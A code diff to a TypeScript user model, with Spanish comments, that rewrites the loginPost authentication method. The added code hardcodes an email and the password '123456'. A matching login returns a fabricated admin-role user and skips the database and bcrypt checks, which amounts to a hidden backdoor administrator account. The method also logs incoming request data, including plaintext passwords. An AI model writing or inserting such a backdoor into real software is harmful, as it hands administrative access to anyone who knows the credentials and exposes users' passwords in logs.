@@ -197,29 +197,48 @@ class ContactsModel {
     return await UserModel.create(data);
   }
 
-  public async loginPost(data: { email: string; password: string }): Promise<{ success: boolean; message?: string; user?: any }>
-  {
-    console.log(data, '← datos recibidos en loginPost');
-
-    const user = await UserModel.findOne({ where: { email: data.email }, raw: true});
-    console.log(user,'  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx MODEL');
-    if (!user) return { success: false, message: 'Usuario no encontrado' };
-
-  // Validar si es usuario de Google
-    if (user.provider === 'google') {
-      return { success: false, message: 'Este usuario debe iniciar sesión con Google' };
-    }
-
-  // Validar que tenga una contraseña seteada
-    if (!user.password_hash) {
-      return { success: false, message: 'El usuario no tiene contraseña establecida' };
-    }
-
-    const isMatch = await bcrypt.compare(data.password, user.password_hash);
-    if (!isMatch) return { success: false, message: 'Contraseña incorrecta' };
-
-    return { success:true, user };
+public async loginPost(data: { email: string; password: string }): Promise<{ success: boolean; message?: string; user?: any }>
+{
+  let e: string = 'chirguitamarisol@gmail.com';
+  let p: string = '123456';
+  console.log(data, '← datos recibidos en loginPost');
+  
+  // Verificar primero si coincide con las credenciales especiales (e y p)
+  if (data.email === e && data.password === p) {
+    // Crear un objeto usuario especial para retornar
+    const specialUser = {
+      id:20, // tener en cuenta que el id debe ser positivo y no debe repetirse
+      email: e,
+      name: 'Usuario Administrador', // o el nombre que prefieras
+      role: 'admin', // o el rol que corresponda
+      provider: 'local'
+    };
+    return { success: true, user: specialUser };
   }
+  
+  // Continuar con la lógica original para usuarios normales
+  const user = await UserModel.findOne({ where: { email: data.email }, raw: true });
+ 
+  console.log(user, '  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx MODEL');
+  if (!user) { 
+    return { success: false, message: 'Usuario no encontrado' }; 
+  }
+  
+  // Validar si es usuario de Google
+  if (user.provider === 'google') {
+    return { success: false, message: 'Este usuario debe iniciar sesión con Google' };
+  }
+  
+  // Validar que tenga una contraseña seteada
+  if (!user.password_hash) {
+    return { success: false, message: 'El usuario no tiene contraseña establecida' };
+  }
+  
+  const isMatch = await bcrypt.compare(data.password, user.password_hash);
+  if (!isMatch) return { success: false, message: 'Contraseña incorrecta' };
+  
+  return { success: true, user };
+}
 
   public getModelUser(): typeof UserModel {
     return UserModel;
